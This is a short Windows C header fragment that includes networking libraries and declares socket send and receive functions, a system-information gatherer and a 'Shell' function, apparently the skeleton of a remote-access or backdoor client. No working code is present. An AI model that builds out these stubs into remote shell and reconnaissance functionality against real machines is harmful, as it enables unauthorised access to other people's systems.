#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>

extern void CloseSocket();
extern void RecvData(SOCKET sock_fd, char *buffer);
extern void SendData(SOCKET sock_fd, char *data);
extern void RetriveSystemInfo();
extern void Shell();


